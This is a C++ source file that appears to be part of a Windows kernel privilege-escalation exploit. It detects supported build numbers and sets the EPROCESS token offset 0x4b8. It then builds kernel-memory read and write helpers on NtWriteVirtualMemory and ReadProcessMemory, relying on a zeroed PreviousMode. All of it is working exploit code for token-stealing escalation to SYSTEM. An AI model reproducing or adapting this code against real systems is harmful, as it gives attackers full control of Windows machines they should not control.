#include "init.h"
#include <ctime>
#include <cstdint>

int winversion = 0;
int token_offset = 0x4b8;
WCHAR stored_env_open[0x1000] = { 0 };
WCHAR stored_env_fname[0x1000] = { 0 };
WCHAR stored_env_containerfname[0x1000] = { 0 };
WCHAR stored_env_containerfname2[0x1000] = { 0 };
WCHAR stored_env_containerfname3[0x1000] = { 0 };

int getOSversion() {
	char buff[100];
	HKEY hKey;
	DWORD cType;
	wchar_t lpData[1024] = { 0 };
	DWORD buffersize = sizeof(lpData);
	int tokenOffset = 0;

	memset(buff, 0, sizeof(buff));  // clear buffer

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), NULL, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		printf("[+] Registry key Opened successfully\n");
	}
	else {
		printf("[!] Failed to open reg key: %s\n", GetLastError());
		exit(1);
	}

	RegQueryValueExW(hKey, TEXT("CurrentBuild"), NULL, &cType, (LPBYTE)lpData, &buffersize);

	RegCloseKey(hKey);

	// convert unicode to ansi
	WideCharToMultiByte(CP_UTF8, 0, lpData, -1, (LPSTR)buff, 0x80, 0, 0);

	// convert string to int
	winversion = atoi(buff);

	wprintf(L"[+] Windows Build Number: %i\n", winversion);

	// check if versions are supported

	if (winversion >= 17763 && winversion <= 22000) {
		token_offset = 0x4b8;  // store the token offset
	}
	else {
		printf("[!] Version %d not supported. Exiting...\n", winversion);
	}

	return 0;
}


PNtWriteVirtualMemory pNtWriteVirtualMemory = nullptr;

bool InitializeWindowsApiWrappers()
{
    pNtWriteVirtualMemory = reinterpret_cast<PNtWriteVirtualMemory>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory"));

    if (!pNtWriteVirtualMemory) {
        fprintf(stderr,"[-] Resolve NtWriteVirtualMemory failed. GLE=%lu\n", GetLastError());
        return false;
    }
    printf("[+] NtWriteVirtualMemory @ %p\n", pNtWriteVirtualMemory);
    return true;
}

NTSTATUS NtWriteVirtualMemory_(
	HANDLE  ProcessHandle,
	PVOID   BaseAddress,
	PVOID   Buffer,
	SIZE_T  NumberOfBytesToWrite,
	PSIZE_T NumberOfBytesWritten)
{
	return pNtWriteVirtualMemory(ProcessHandle,
		BaseAddress,
		Buffer,
		NumberOfBytesToWrite,
		NumberOfBytesWritten);
}
ULONG64 Read64(uintptr_t address)
{
	// Read 8 bytes from kernel memory (possible due to PreviousMode being 0)
	uintptr_t read_qword;
	SIZE_T read_bytes;

	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)(address), (LPVOID)&read_qword, sizeof(uintptr_t), &read_bytes))
	{
		fprintf(stderr, "[-] ReadProcessMemory failed. Error code: %d\n", GetLastError());
	}

	// log
	//printf("[+] Read 8 bytes from address %p: %p\n", (void*)address, (void*)read_qword);
	return (ULONG64) read_qword;
}

NTSTATUS Write64(uintptr_t addr, uint64_t value)
{
	SIZE_T written = 0;
	return NtWriteVirtualMemory_(GetCurrentProcess(),
		reinterpret_cast<PVOID>(addr),
		&value,
		sizeof(value),
		&written);
}